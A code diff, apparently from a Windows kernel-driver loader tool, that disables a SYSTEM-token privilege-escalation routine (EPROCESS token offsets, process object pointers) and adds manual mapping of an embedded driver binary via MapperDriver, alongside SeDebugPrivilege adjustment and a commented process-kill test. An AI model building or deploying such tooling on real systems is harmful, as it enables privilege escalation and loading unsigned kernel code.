@@ -4,6 +4,7 @@
 #include <iostream>
 #include "Log.hpp"
 #include "Utils.hpp"
+#include "MappingDriverBin.hpp"
 #include "DriverLoader.h"
 #include "DriverWorker.hpp"
 
@@ -160,7 +161,7 @@ int main(int args, char** argv)
 	SetConsoleTextAttribute(hConsole, 5);  // 5 13 pink
 
 
-	DWORD EPROCESS_TOKEN_OFFSET = 0;
+	/*DWORD EPROCESS_TOKEN_OFFSET = 0;
 	DWORD ProtectionOffset		= 0;
 	DWORD SignatureLevelOffset	= 0;
 	DWORD buildNumber = GetWindowsBuildNumber();
@@ -197,7 +198,7 @@ int main(int args, char** argv)
 	else
 	{
 		return -1;
-	}
+	}*/
 
 	constexpr std::string_view art = R"(
 
@@ -224,16 +225,6 @@ $$$$$$$  | $$ | $$ |  $$ | \$$$$$$$ | $$ |       \$$$$$$$ |      $$$$$$$$$ \$  /
 		return 1;
 	}
 
-	// Test Kill Process
-	//ULONG nPid = atoi(argv[1]);
-
-	////Sleep(10000);
-	//DriverWorker::Kill(nPid);
-
-	ULONG64 SystemProcess{ 0 };
-	ULONG64 CurrentProcess{ 0 };
-
-	
 	BOOLEAN bResult{ FALSE };
 	NTSTATUS status = Utils::RtlAdjustPrivilege(20, TRUE, FALSE, &bResult);
 	if (!NT_SUCCESS(status))
@@ -241,6 +232,15 @@ $$$$$$$  | $$ | $$ |  $$ | \$$$$$$$ | $$ |       \$$$$$$$ |      $$$$$$$$$ \$  /
 		LOG("[-] Failed to adjust privilege. Error code: 0x" << std::hex << status << " line = " << __LINE__);
 		return 1;
 	}
+
+	// Test Kill Process
+	//ULONG nPid = atoi(argv[1]);
+
+	////Sleep(10000);
+	//DriverWorker::Kill(nPid);
+
+	/*ULONG64 SystemProcess{ 0 };
+	ULONG64 CurrentProcess{ 0 };
 
 	auto nResult = GetObjectPointer(&SystemProcess, 4, ULongToHandle(4));
 	if (nResult != 0 || SystemProcess == 0)
@@ -259,7 +259,7 @@ $$$$$$$  | $$ | $$ |  $$ | \$$$$$$$ | $$ |       \$$$$$$$ |      $$$$$$$$$ \$  /
 	{
 		LOG("[-] GetObjectPtr failed for current process with error code: " << nResult);
 		return nResult;
-	}
+	}*/
 
 
 	auto initResult = DriverWorker::InitializeDriver();
@@ -269,11 +269,11 @@ $$$$$$$  | $$ | $$ |  $$ | \$$$$$$$ | $$ |       \$$$$$$$ |      $$$$$$$$$ \$  /
 		return 1;
 	}
 
-	SetConsoleTextAttribute(hConsole, 13);  // 5 13 pink
+	//SetConsoleTextAttribute(hConsole, 13);  // 5 13 pink
 
-	DriverLoader::PrivilegeEscalation(SystemProcess, CurrentProcess, EPROCESS_TOKEN_OFFSET);
-	
-	SetConsoleTextAttribute(hConsole, 7);
+	//DriverLoader::PrivilegeEscalation(SystemProcess, CurrentProcess, EPROCESS_TOKEN_OFFSET);
+	//
+	//SetConsoleTextAttribute(hConsole, 7);
 
 	////DriverLoader::PS_PROTECTION protection{};
 	//////protection.Level = 0x01; // Protected Light
@@ -287,11 +287,26 @@ $$$$$$$  | $$ | $$ |  $$ | \$$$$$$$ | $$ |       \$$$$$$$ |      $$$$$$$$$ \$  /
 	//			"Process Status",
 	//			MB_OK);
 	//
+
+	// loader mapping driver
+
+	do
+	{
+		auto initMemoryResult = DriverLoader::InitMemoryManager();
+		if (!initMemoryResult)
+		{
+			LOG("[-] Failed to initialize memory manager");
+			break;
+		}
+
+		SetConsoleTextAttribute(hConsole, 13);  // 5 13 pink
+		DriverLoader::MapperDriver(Mapper::hexData);
+		SetConsoleTextAttribute(hConsole, 7);
+
+	} while (FALSE);
+
+
 	DriverWorker::UninitializeDriver();
-
-
-	
-
 
 	system("pause");
 
